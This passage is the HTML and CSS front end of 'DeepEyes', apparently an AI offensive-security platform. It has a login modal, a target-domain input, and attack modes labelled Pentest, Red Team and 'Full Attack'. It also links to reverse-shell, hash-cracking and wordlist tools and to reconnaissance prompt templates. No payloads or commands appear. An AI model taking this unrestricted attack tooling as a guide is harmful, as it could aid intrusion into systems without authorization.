            25% { transform: translate(-100%, -100%) translate3d(100%, 0, 0) rotate(90deg); }
            50% { transform: translate(-100%, -100%) translate3d(100%, 100%, 0) rotate(180deg); }
            75% { transform: translate(-100%, -100%) translate3d(0, 100%, 0) rotate(270deg); }
            100% { transform: translate(-100%, -100%) translate3d(0, 0, 0) rotate(360deg); }
        }
        
        @keyframes blob-bounce-2 {
            0% { transform: translate(-100%, -100%) translate3d(100%, 100%, 0) rotate(0deg); }
            25% { transform: translate(-100%, -100%) translate3d(0, 100%, 0) rotate(-90deg); }
            50% { transform: translate(-100%, -100%) translate3d(0, 0, 0) rotate(-180deg); }
            75% { transform: translate(-100%, -100%) translate3d(100%, 0, 0) rotate(-270deg); }
            100% { transform: translate(-100%, -100%) translate3d(100%, 100%, 0) rotate(-360deg); }
        }
        
        @keyframes blob-bounce-3 {
            0% { transform: translate(-100%, -100%) translate3d(50%, 0, 0) rotate(45deg); }
            25% { transform: translate(-100%, -100%) translate3d(100%, 50%, 0) rotate(135deg); }
            50% { transform: translate(-100%, -100%) translate3d(50%, 100%, 0) rotate(225deg); }
            75% { transform: translate(-100%, -100%) translate3d(0, 50%, 0) rotate(315deg); }
            100% { transform: translate(-100%, -100%) translate3d(50%, 0, 0) rotate(405deg); }
        }
        
        @keyframes blob-bounce-4 {
            0% { transform: translate(-100%, -100%) translate3d(0, 50%, 0) rotate(0deg); }
            33% { transform: translate(-100%, -100%) translate3d(100%, 0, 0) rotate(120deg); }
            66% { transform: translate(-100%, -100%) translate3d(50%, 100%, 0) rotate(240deg); }
            100% { transform: translate(-100%, -100%) translate3d(0, 50%, 0) rotate(360deg); }
        }
        
        .blob-card:hover .blob {
            filter: blur(15px);
            opacity: 1;
        }
        
        .blob-card:hover {
            transform: translateY(-4px);
        }
        
        .blob-card {
            transition: transform 0.3s ease;
        }
        
        /* Template & Tools Styles - Cyber Terminal */
        
        /* Tools Disabled State */
        .tool-btn.disabled {
            opacity: 0.4;
            cursor: not-allowed;
            pointer-events: none;
            filter: grayscale(100%);
        }
        .tool-btn.disabled .tool-icon {
            filter: grayscale(100%) !important;
            color: #666 !important;
        }
        .tool-btn.disabled .tool-label {
            color: #666 !important;
        }
        .tool-btn.disabled:hover {
            border-color: rgba(100, 100, 100, 0.3) !important;
            background: rgba(0, 0, 0, 0.3) !important;
        }
        
        .template-category {
            background: rgba(10, 10, 15, 0.7);
            border: 1px solid rgba(0, 255, 136, 0.15);
            border-radius: 0;
            padding: 12px;
            position: relative;
            clip-path: polygon(
                0 4px, 4px 4px, 4px 0,
                calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px,
                100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%,
                4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px)
            );
        }
        
        .template-category::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
            opacity: 0.3;
        }
        
        .template-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            width: 100%;
            padding: 10px 14px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.1);
            border-radius: 0;
            color: #94A3B8;
            font-size: 12px;
            font-family: var(--font-mono);
            text-align: left;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }
        
        .template-btn::before {
            content: '>';
            position: absolute;
            left: -20px;
            color: var(--neon-green);
            transition: left 0.2s ease;
            font-family: var(--font-mono);
        }
        
        .template-btn:hover {
            background: rgba(0, 255, 136, 0.08);
            border-color: rgba(0, 255, 136, 0.3);
            color: var(--neon-green);
            padding-left: 24px;
            text-shadow: 0 0 10px var(--neon-green);
        }
        
        .template-btn:hover::before {
            left: 8px;
        }
        
        .template-btn i {
            font-size: 14px;
            width: 18px;
            text-align: center;
        }
        
        /* Checklist Item - Cyber Style */
        .checklist-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.1);
            border-radius: 0;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: var(--font-mono);
            position: relative;
            clip-path: polygon(
                0 4px, 4px 4px, 4px 0,
                calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px,
                100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%,
                4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px)
            );
        }
        
        .checklist-item:hover {
            background: rgba(249, 115, 22, 0.08);
            border-color: rgba(249, 115, 22, 0.3);
            box-shadow: 0 0 15px rgba(249, 115, 22, 0.1);
        }
        
        .checklist-item.checked {
            background: rgba(0, 255, 136, 0.08);
            border-color: rgba(0, 255, 136, 0.3);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.1);
        }
        
        .checklist-item .check-box {
            width: 22px;
            height: 22px;
            border: 2px solid rgba(249, 115, 22, 0.5);
            border-radius: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .checklist-item.checked .check-box {
            background: linear-gradient(135deg, #00FF88, #00D4FF);
            border-color: transparent;
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        
        .checklist-item .check-box i {
            color: #0a0a0f;
            font-size: 12px;
            opacity: 0;
            transform: scale(0);
            transition: all 0.2s ease;
        }
        
        .checklist-item.checked .check-box i {
            opacity: 1;
            transform: scale(1);
        }
        
        .checklist-item .item-text {
            flex: 1;
            color: #94A3B8;
            font-size: 13px;
            transition: color 0.2s ease;
        }
        
        .checklist-item.checked .item-text {
            color: #00FF88;
            text-decoration: line-through;
            text-decoration-color: rgba(0, 255, 136, 0.4);
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
        }
        
        .checklist-item .item-code {
            font-size: 10px;
            color: var(--neon-cyan);
            font-family: var(--font-mono);
            background: rgba(0, 212, 255, 0.1);
            padding: 2px 8px;
            border-radius: 0;
            border: 1px solid rgba(0, 212, 255, 0.2);
        }
    </style>
</head>
<body class="min-h-screen text-gray-100">
    
    <!-- Auth Modal - Outside #app for proper visibility control -->
    <div id="authModal" class="fixed inset-0 z-50 items-center justify-center hidden overflow-hidden" style="background: radial-gradient(ellipse at center, #12121a 0%, #0a0a0f 100%);">
        <!-- Animated Background -->
        <div class="absolute inset-0 pointer-events-none overflow-hidden">
            <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-[rgba(0,212,255,0.08)] rounded-full blur-3xl animate-pulse"></div>
            <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-[rgba(0,255,136,0.06)] rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div>
        </div>
        <!-- Grid Background -->
        <div class="absolute inset-0 pointer-events-none" style="background-image: linear-gradient(rgba(0, 212, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.03) 1px, transparent 1px); background-size: 50px 50px; mask-image: radial-gradient(ellipse 80% 50% at 50% 50%, black 40%, transparent 100%);"></div>
        
        <!-- Navbar -->
        <nav class="fixed top-3 sm:top-5 left-1/2 -translate-x-1/2 z-[1001] w-[95%] sm:w-[90%] max-w-[900px]">
            <div class="flex items-center justify-between px-4 sm:px-6 py-2.5 sm:py-3 rounded-full" style="background: rgba(10, 10, 15, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(0, 212, 255, 0.15); box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);">
                <a href="/" class="flex items-center gap-2 no-underline">
                    <span class="font-semibold text-base sm:text-lg" style="font-family: 'JetBrains Mono', monospace; background: linear-gradient(135deg, #00d4ff, #00ff88); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">DeepEyes</span>
                </a>
                <div class="hidden md:flex items-center gap-7">
                    <a href="/#como-funciona" class="text-[#a0a0b0] no-underline text-sm font-medium hover:text-[#00d4ff] transition-colors">Como Funciona</a>
                    <a href="/#recursos" class="text-[#a0a0b0] no-underline text-sm font-medium hover:text-[#00d4ff] transition-colors">Recursos</a>
                    <a href="/docs" class="text-[#a0a0b0] no-underline text-sm font-medium hover:text-[#00d4ff] transition-colors">Docs</a>
                </div>
                <a href="/" class="flex items-center gap-2 px-4 sm:px-5 py-2 sm:py-2.5 rounded-full font-semibold text-xs sm:text-sm no-underline transition-all hover:scale-105" style="background: linear-gradient(135deg, #00d4ff, #00ff88); color: #0a0a0f; box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);">
                    ‹ Voltar
                </a>
            </div>
        </nav>
        
        <div class="relative z-10 w-full max-w-sm lg:max-w-2xl mx-4 p-6 max-h-[85vh] overflow-y-auto" style="background: rgba(26, 26, 36, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 16px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 40px rgba(0, 212, 255, 0.1);">
            <!-- Top gradient line -->
            <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00d4ff] to-transparent"></div>
            
            <div class="text-center mb-5">
                <div class="flex items-center justify-center gap-2 mb-2">
                    <span class="text-2xl font-bold" style="font-family: 'JetBrains Mono', monospace; background: linear-gradient(135deg, #00d4ff, #00ff88); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">DeepEyes</span>
                </div>
                <p class="text-[#a0a0b0] text-xs">Deep visibility into security.</p>
            </div>

            <div id="authTabs" class="flex gap-1 mb-4 p-1 rounded-lg" style="background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(0, 212, 255, 0.15);">
                <button class="auth-tab active flex-1 py-2 px-3 text-sm font-semibold transition-all rounded-md" data-tab="login">Login</button>
                <button class="auth-tab flex-1 py-2 px-3 text-sm bg-transparent text-[#a0a0b0] hover:text-[#00d4ff] font-semibold transition-all rounded-md" data-tab="register">Registrar</button>
            </div>

            <form id="loginForm" class="space-y-3">
                <div>
                    <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Email</label>
                    <input type="email" name="email" required autocomplete="email"
                        class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                        placeholder="user@example.com">
                </div>
                <div>
                    <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Senha</label>
                    <input type="password" name="password" required autocomplete="current-password"
                        class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                        placeholder="••••••••">
                </div>
                <button type="submit" class="w-full py-3 text-sm font-semibold transition-all rounded-lg" style="background: linear-gradient(135deg, #00d4ff, #00ff88); color: #0a0a0f; box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);">
                    Entrar no Lab
                </button>
            </form>

            <form id="registerForm" class="hidden">
                <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
                    <div>
                        <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Nome</label>
                        <input type="text" name="name" required autocomplete="name"
                            class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                            placeholder="Seu nome">
                    </div>
                    <div>
                        <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Email</label>
                        <input type="email" name="email" required autocomplete="email"
                            class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                            placeholder="user@gmail.com">
                    </div>
                    <div>
                        <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Celular</label>
                        <input type="tel" name="phone" required autocomplete="tel"
                            class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                            placeholder="(11) 99999-9999"
                            oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').substring(0, 16)">
                    </div>
                    <div>
                        <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Senha</label>
                        <input type="password" name="password" required autocomplete="new-password" minlength="8"
                            class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                            placeholder="••••••••">
                        <p class="text-[10px] text-[#a0a0b0] mt-1">Mín. 8 chars: Aa, 123, @#$</p>
                    </div>
                    <div class="lg:col-span-2">
                        <label class="block text-xs font-medium text-[#00d4ff] mb-1.5" style="font-family: 'JetBrains Mono', monospace;">Confirmar Senha</label>
                        <input type="password" name="password_confirmation" required autocomplete="new-password"
                            class="auth-input w-full px-3 py-2.5 text-sm rounded-lg focus:outline-none"
                            placeholder="••••••••">
                    </div>
                </div>
                <button type="submit" class="w-full py-3 text-sm font-semibold transition-all rounded-lg" style="background: linear-gradient(135deg, #00d4ff, #00ff88); color: #0a0a0f; box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);">
                    Criar Conta
                </button>
            </form>

            <div id="authError" class="hidden mt-3 p-3 rounded-lg text-red-400 text-xs" style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); font-family: 'JetBrains Mono', monospace;"></div>
            
            <p class="text-center text-[#a0a0b0] text-[10px] mt-4" style="font-family: 'JetBrains Mono', monospace;">
                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#00d4ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline mr-1"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
                v1.0
            </p>
        </div>
    </div>

    <!-- Mobile Overlay -->
    <div id="mobileOverlay" onclick="closeMobileSidebar()"></div>

    <div id="app" class="flex h-screen w-full">
        <!-- Sidebar -->
        <aside id="sidebar" class="de-sidebar w-72 flex-shrink-0 flex flex-col">
            <!-- Close button for mobile -->
            <button id="closeSidebarBtn" class="lg:hidden absolute top-4 right-4 w-8 h-8 bg-[rgba(239,68,68,0.1)] hover:bg-[rgba(239,68,68,0.2)] border border-[rgba(239,68,68,0.3)] text-gray-400 hover:text-red-400 flex items-center justify-center transition-all z-10">
                <i class="fas fa-times"></i>
            </button>
            <!-- Logo - Cyber Style -->
            <div class="p-5 border-b border-[rgba(0,255,136,0.15)]">
                <a href="/" class="block">
                    <h1 class="text-2xl font-normal text-white tracking-wide" style="font-family: 'Upheaval', sans-serif;">DeepEyes</h1>
                    <p class="text-[10px] text-[#00D4FF] uppercase tracking-wider mt-1">Security AI Platform</p>
                </a>
            </div>
            
            <!-- Attack Mode Selector - Cyber Terminal Style -->
            <div class="p-4 border-b border-[rgba(0,255,136,0.15)]">
                <label class="text-[9px] font-semibold text-[#00FF88] uppercase tracking-[3px] mb-3 block flex items-center gap-2" style="font-family: var(--font-mono);">
                    <i class="fas fa-crosshairs"></i>
                    // ATTACK_MODE
                </label>
                <input type="hidden" id="profileSelector" value="pentest">
                <div class="grid grid-cols-3 gap-2">
                    <div class="attack-mode mode-pentest active" data-value="pentest" onclick="selectAttackMode(this)">
                        <i class="fas fa-shield-halved"></i>
                        <span>Pentest</span>
                    </div>
                    <div class="attack-mode mode-redteam" data-value="redteam" onclick="selectAttackMode(this)">
                        <i class="fas fa-crosshairs"></i>
                        <span>Red Team</span>
                    </div>
                    <div class="attack-mode mode-fullattack" data-value="fullattack" onclick="selectAttackMode(this)">
                        <i class="fas fa-biohazard"></i>
                        <span>Full Attack</span>
                    </div>
                </div>
                <p class="text-[9px] text-[#00FF88] mt-2 text-center" id="profileDescription" style="font-family: var(--font-mono);">Modo ofensivo autorizado</p>
            </div>
            
            <!-- Toast de Plano Necessário -->
            <div id="planToast" class="fixed top-4 right-4 z-[9999] hidden">
                <div class="bg-[#1a1f2e] border border-yellow-500/30 rounded-lg p-3 shadow-lg flex items-center gap-3">
                    <i class="fas fa-lock text-yellow-500"></i>
                    <span class="text-sm text-gray-300">Ative um plano para desbloquear</span>
                </div>
            </div>
            
            <!-- Hidden legacy dropdown for compatibility -->
            <div class="hidden">
                <div class="profile-dropdown" id="profileDropdown">
                    <div class="profile-selected" onclick="toggleProfileDropdown()">
                        <i class="fas fa-skull-crossbones text-[#00FF88] profile-icon" id="selectedProfileIcon"></i>
                        <span id="selectedProfileText">DeepEyes - Ofensivo</span>
                        <i class="fas fa-chevron-down text-gray-400 chevron"></i>
                    </div>
                    <div class="profile-options">
                        <div class="profile-option selected" data-value="pentest" data-icon="fa-shield-halved" data-color="text-[#00FF88]" onclick="selectProfile(this)">
                            <i class="fas fa-shield-halved text-[#00FF88]"></i>
                            <span>DeepEyes - Pentest</span>
                        </div>
                        <div class="profile-option" data-value="redteam" data-icon="fa-crosshairs" data-color="text-orange-400" onclick="selectProfile(this)">
                            <i class="fas fa-crosshairs text-orange-400"></i>
                            <span>BlackSentinel - Red Team</span>
                        </div>
                        <div class="profile-option" data-value="fullattack" data-icon="fa-biohazard" data-color="text-red-400" onclick="selectProfile(this)">
                            <i class="fas fa-biohazard text-red-400"></i>
                            <span>DarkMind - Full Attack</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- New Session Button - Neon Style -->
            <div class="p-4">
                <button id="newChatBtn" class="new-session-btn">
                    <i class="fas fa-plus mr-2"></i>NOVA SESSÃO
                </button>
            </div>
            
            <style>
                .new-session-btn {
                    --green: #1BFD9C;
                    width: 100%;
                    font-size: 14px;
                    padding: 0.8em 1.5em;
                    letter-spacing: 0.1em;
                    position: relative;
                    font-family: 'JetBrains Mono', monospace;
                    font-weight: 600;
                    border-radius: 0.6em;
                    overflow: hidden;
                    transition: all 0.3s;
                    border: 2px solid var(--green);
                    background: linear-gradient(to right, rgba(27, 253, 156, 0.1) 1%, transparent 40%, transparent 60%, rgba(27, 253, 156, 0.1) 100%);
                    color: var(--green);
                    box-shadow: inset 0 0 10px rgba(27, 253, 156, 0.4), 0 0 9px 3px rgba(27, 253, 156, 0.1);
                    cursor: pointer;
                }
                .new-session-btn:hover {
                    color: #82ffc9;
                    box-shadow: inset 0 0 10px rgba(27, 253, 156, 0.6), 0 0 9px 3px rgba(27, 253, 156, 0.2);
                }
                .new-session-btn:before {
                    content: "";
                    position: absolute;
                    left: -4em;
                    width: 4em;
                    height: 100%;
                    top: 0;
                    transition: transform .4s ease-in-out;
                    background: linear-gradient(to right, transparent 1%, rgba(27, 253, 156, 0.1) 40%, rgba(27, 253, 156, 0.1) 60%, transparent 100%);
                }
                .new-session-btn:hover:before {
                    transform: translateX(20em);
                }
            </style>
            
            <!-- Tools Menu - Cyber Grid -->
            <div class="px-4 pb-2">
                <div class="text-[9px] font-semibold text-[#00D4FF] uppercase tracking-[3px] px-1 py-2 flex items-center gap-2" style="font-family: var(--font-mono);">
                    <i class="fas fa-toolbox text-[8px]"></i>
                    // TOOLS
                </div>
                <div id="toolsGrid" class="grid grid-cols-3 gap-2">
                    <!-- Checklist -->
                    <a href="/checklist" id="tool-checklist" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(249,115,22,0.15)] hover:border-[rgba(249,115,22,0.4)] hover:bg-[rgba(249,115,22,0.08)] transition-all group no-underline rounded-lg">
                        <i class="fas fa-list-check text-[#F97316] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#F97316] tool-label" style="font-family: var(--font-mono);">CHECKLIST</span>
                    </a>
                    <!-- Decoder/Encoder -->
                    <button onclick="openTool('decoder')" id="tool-decoder" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,212,255,0.15)] hover:border-[rgba(0,212,255,0.4)] hover:bg-[rgba(0,212,255,0.08)] transition-all group rounded-lg">
                        <i class="fas fa-code text-[#00D4FF] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#00D4FF] tool-label" style="font-family: var(--font-mono);">DECODER</span>
                    </button>
                    <!-- Hash Cracker -->
                    <button onclick="openTool('hash')" id="tool-hash" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(239,68,68,0.15)] hover:border-[rgba(239,68,68,0.4)] hover:bg-[rgba(239,68,68,0.08)] transition-all group rounded-lg">
                        <i class="fas fa-key text-[#EF4444] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#EF4444] tool-label" style="font-family: var(--font-mono);">HASH</span>
                    </button>
                    <!-- Reverse Shell Generator -->
                    <button onclick="openTool('revshell')" id="tool-revshell" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,255,136,0.15)] hover:border-[rgba(0,255,136,0.4)] hover:bg-[rgba(0,255,136,0.08)] transition-all group rounded-lg">
                        <i class="fas fa-terminal text-[#00FF88] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#00FF88] tool-label" style="font-family: var(--font-mono);">REVSHELL</span>
                    </button>
                    <!-- Wordlist Generator -->
                    <button onclick="openTool('wordlist')" id="tool-wordlist" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(168,85,247,0.15)] hover:border-[rgba(168,85,247,0.4)] hover:bg-[rgba(168,85,247,0.08)] transition-all group rounded-lg">
                        <i class="fas fa-file-lines text-[#A855F7] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#A855F7] tool-label" style="font-family: var(--font-mono);">WORDLIST</span>
                    </button>
                    <!-- Terminal -->
                    <a href="/terminal" id="tool-terminal" data-tool="true" class="tool-btn flex flex-col items-center gap-1 p-2 bg-[rgba(0,0,0,0.3)] border border-[rgba(234,179,8,0.15)] hover:border-[rgba(234,179,8,0.4)] hover:bg-[rgba(234,179,8,0.08)] transition-all group no-underline rounded-lg">
                        <i class="fas fa-terminal text-[#EAB308] group-hover:scale-110 transition-transform tool-icon"></i>
                        <span class="text-[8px] text-gray-400 group-hover:text-[#EAB308] tool-label" style="font-family: var(--font-mono);">TERMINAL</span>
                    </a>
                </div>
            </div>
            
            <!-- Sessions List - Cyber Style -->
            <div class="flex-1 overflow-y-auto px-3 py-2">
                <div class="text-[9px] font-semibold text-[#00FF88] uppercase tracking-[3px] px-3 py-2 flex items-center gap-2" style="font-family: var(--font-mono);">
                    <i class="fas fa-history text-[8px]"></i>
                    // SESSIONS
                </div>
                <div id="sessionsList" class="space-y-1"></div>
            </div>
            
            <!-- User Info - Cyber Style -->
            <div class="p-4 border-t border-[rgba(0,255,136,0.15)]">
                <div id="userInfo" class="flex items-center gap-3 p-3 bg-[rgba(0,0,0,0.3)] border border-[rgba(0,255,136,0.15)] hover:border-[rgba(0,255,136,0.4)] transition-all cursor-pointer rounded-xl" onclick="window.location.href='/profile'">
                    <a href="/profile" id="userAvatarLink" class="w-10 h-10 rounded-full overflow-hidden border-2 border-[#00FF88]/40 flex-shrink-0 relative bg-[#1a1a24]">
                        <i id="userAvatarIcon" class="fas fa-user text-[#00FF88] absolute inset-0 flex items-center justify-center"></i>
                        <img id="userAvatarImg" src="" alt="Avatar" class="w-full h-full object-cover relative z-10 hidden">
                    </a>
                    <div class="flex-1 min-w-0">
                        <a href="/profile" id="userName" class="text-sm font-semibold text-[#00FF88] hover:text-white transition-colors block truncate" style="font-family: var(--font-mono);">NOT_LOGGED</a>
                        <div id="userPlanBadge" class="text-[9px] text-[#00D4FF] uppercase tracking-wider font-semibold" style="font-family: var(--font-mono);">FREE</div>
                    </div>
                    <button id="logoutBtn" class="text-gray-500 hover:text-red-400 transition-colors hidden" title="Sair" onclick="event.stopPropagation()">
                        <i class="fas fa-sign-out-alt"></i>
                    </button>
                </div>
            </div>
        </aside>
        
        <!-- Mobile Sidebar Toggle - Cyber Style -->
        <button id="mobileMenuBtn" class="fixed top-4 left-4 z-50 lg:hidden w-10 h-10 bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.3)] text-[#00FF88] flex items-center justify-center hover:bg-[rgba(0,255,136,0.2)] hover:shadow-[0_0_15px_rgba(0,255,136,0.3)] transition-all" style="clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
            <i class="fas fa-bars"></i>
        </button>
        
        <!-- Delete Confirmation Modal -->
        <div id="deleteModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeDeleteModal()"></div>
            <div class="relative z-10 w-full max-w-sm mx-4 bg-[#0B0F14] rounded-2xl p-6 border border-[rgba(239,68,68,0.3)] shadow-2xl" style="box-shadow: 0 0 40px rgba(239,68,68,0.1);">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-red-500 to-transparent"></div>
                <div class="text-center mb-6">
                    <div class="w-16 h-16 mx-auto mb-4 rounded-2xl bg-red-500/10 flex items-center justify-center border border-red-500/30">
                        <i class="fas fa-trash-alt text-2xl text-red-500"></i>
                    </div>
                    <h3 class="text-lg font-bold text-white mb-2">Excluir Sessão</h3>
                    <p class="text-gray-400 text-sm">Tem certeza que deseja excluir esta sessão? Esta ação não pode ser desfeita.</p>
                </div>
                <div class="flex gap-3">
                    <button onclick="closeDeleteModal()" class="flex-1 bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Cancelar</button>
                    <button onclick="confirmDeleteSession()" class="flex-1 bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white rounded-xl py-3 font-medium transition-all glow-red">
                        <i class="fas fa-trash-alt mr-2"></i>Excluir
                    </button>
                </div>
            </div>
        </div>
        
        <!-- Domain Input Modal -->
        <div id="domainModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeDomainModal()"></div>
            <div class="relative z-10 w-full max-w-md mx-4 bg-[#0B0F14] rounded-2xl p-6 border border-[rgba(0,255,136,0.3)] shadow-2xl" style="box-shadow: 0 0 60px rgba(0,255,136,0.1);">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00FF88] to-transparent"></div>
                <h3 class="text-xl font-bold text-white mb-4 flex items-center gap-3">
                    <div class="w-10 h-10 rounded-xl bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.3)] flex items-center justify-center">
                        <i class="fas fa-crosshairs text-[#00FF88]"></i>
                    </div>
                    Definir Alvo
                </h3>
                <div class="mb-5">
                    <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Domínio do Alvo</label>
                    <input type="text" id="domainInput" 
                        class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-4 text-white focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_0_3px_rgba(0,255,136,0.1)] transition-all font-mono"
                        placeholder="target.example.com"
                        onkeydown="if(event.key === 'Enter') confirmDomainModal()">
                </div>
                <div class="flex gap-3">
                    <button onclick="closeDomainModal()" class="flex-1 bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Cancelar</button>
                    <button onclick="confirmDomainModal()" class="flex-1 bg-gradient-to-r from-[#00FF88] to-[#00D4FF] hover:opacity-90 text-[#0B0F14] rounded-xl py-3 font-bold transition-all">
                        <i class="fas fa-terminal mr-2"></i>Iniciar Sessão
                    </button>
                </div>
            </div>
        </div>
        
        <!-- Templates Modal -->
        <div id="templatesModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeTemplatesModal()"></div>
            <div class="relative z-10 w-full max-w-2xl mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,255,136,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00FF88] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(0,255,136,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.3)] flex items-center justify-center">
                            <i class="fas fa-file-code text-[#00FF88]"></i>
                        </div>
                        Templates de Prompts
                    </h3>
                    <p class="text-gray-400 text-sm mt-2">Prompts prontos para acelerar seu pentest</p>
                </div>
                <div class="flex-1 overflow-y-auto p-4">
                    <div class="grid gap-3" id="templatesList">
                        <!-- Reconhecimento -->
                        <div class="template-category">
                            <h4 class="text-xs font-semibold text-[#00FF88] uppercase tracking-wider mb-2 flex items-center gap-2">
                                <i class="fas fa-search"></i> Reconhecimento
                            </h4>
                            <div class="grid gap-2">
                                <button onclick="useTemplate('recon_subdomain')" class="template-btn">
                                    <i class="fas fa-sitemap text-cyan-400"></i>
                                    <span>Enumeração de Subdomínios</span>
                                </button>
                                <button onclick="useTemplate('recon_tech')" class="template-btn">
                                    <i class="fas fa-microchip text-cyan-400"></i>
                                    <span>Identificar Tecnologias</span>
